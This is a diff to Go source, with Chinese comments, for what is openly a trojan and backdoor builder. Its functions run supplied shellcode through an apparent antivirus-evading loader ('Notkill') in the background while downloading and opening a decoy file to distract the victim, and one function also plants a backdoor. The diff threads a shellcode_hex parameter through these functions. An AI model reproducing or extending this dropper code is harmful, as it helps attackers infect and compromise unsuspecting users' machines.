@@ -6,8 +6,8 @@ import (
 )
 
 //只生成木马
-func Onlymuma() {
-	mylib.Notkill()
+func Onlymuma(shellcode_hex string) {
+	mylib.Notkill(shellcode_hex)
 }
 
 //只植入成后门
@@ -17,20 +17,22 @@ func Onlybackdoor(url string, path string) {
 }
 
 //生成木马并弹出文件
-func Tnuma(url string, path string) {
+func Tnuma(shellcode_hex string, url string, path string) {
 	//执行木马程序
 	go func() {
 		//执行木马程序
-		mylib.Notkill()
+		mylib.Notkill(shellcode_hex)
 		//执行完成之后正常暂停
 		mylib.Stop()
 	}()
 
 	//判断url的值，如果为空，则直接打开网站链接，如果不为空，将链接下载到本地，然后打开
-	if url != "" {
+	//不是http
+	if string(path[0:4]) != "http" {
 		//下载要弹出的文件
 		mylib.DownloadFile(url, path)
 	}
+	//是http
 	//打开文件
 	mylib.Openfile(path)
 	//死循环防止go协程死亡
@@ -38,11 +40,11 @@ func Tnuma(url string, path string) {
 }
 
 //生成木马弹出文件植入后门
-func MTZmuma(url string, path string, url1 string, path1 string) {
+func MTZmuma(shellcode_hex string, url string, path string, url1 string, path1 string) {
 	//执行木马程序
 	go func() {
 		//执行木马程序
-		mylib.Notkill()
+		mylib.Notkill(shellcode_hex)
 		//执行完成之后正常暂停
 		mylib.Stop()
 	}()
